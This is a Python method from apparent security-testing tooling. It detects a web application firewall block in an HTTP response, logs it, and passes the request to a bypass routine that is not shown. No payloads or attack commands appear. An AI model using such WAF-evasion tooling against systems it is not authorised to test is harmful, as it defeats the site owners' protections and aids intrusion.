    async def wrap_async(
        self,
        client: httpx.AsyncClient,
        method: str,
        url: str,
        response: httpx.Response,
        **kwargs,
    ) -> httpx.Response:
        """
        Wrap an already-made async response with WAF detection.

        Call this from existing harnesses after they get a response:

            resp = await client.get(url)
            resp = await waf.wrap_async(client, "GET", url, resp)

        If not blocked, returns the original response immediately (zero cost).
        If blocked, tries bypasses and returns the best response.
        """
        waf = self.detect_waf(response)
        if waf is None:
            return response

        self._stats["waf_blocks"] += 1
        path = "/" + url.split("/", 3)[-1] if "/" in url else "/"
        self._log(f"[!] WAF detected: {waf['name']} ({waf['confidence']}) at {url}")
        self._write_log(
            "blocks_log.txt",
            f"WAF={waf['name']} confidence={waf['confidence']} method={method} url={url} status={response.status_code} evidence={waf['evidence']}",
        )
        return await self._async_bypass(client, method, url, response, waf, **kwargs)

